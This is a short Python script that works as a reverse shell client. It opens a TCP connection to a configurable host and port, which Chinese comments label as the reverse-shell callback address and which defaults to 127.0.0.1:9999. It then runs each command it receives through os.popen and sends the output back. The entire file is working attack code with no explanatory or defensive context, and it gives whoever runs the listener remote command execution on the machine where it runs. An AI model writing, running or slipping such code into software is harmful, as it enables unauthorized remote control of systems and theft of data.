# encoding=utf-8

import socket
import os


def run_cmd(sock):
    while True:
        cmd = sock.recv(1024)
        if cmd.decode('utf-8') == 'quit()':
            break
        else:
            res = os.popen(cmd.decode('utf-8'))
            sock.send(res.read().encode('utf-8'))


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = '127.0.0.1'  # shell反弹的主机IP
    port = 9999  # shell反弹的端口号
    sock = (host, port)
    s.connect_ex(sock)
    run_cmd(s)
    s.close()

if __name__ == '__main__':
    main()
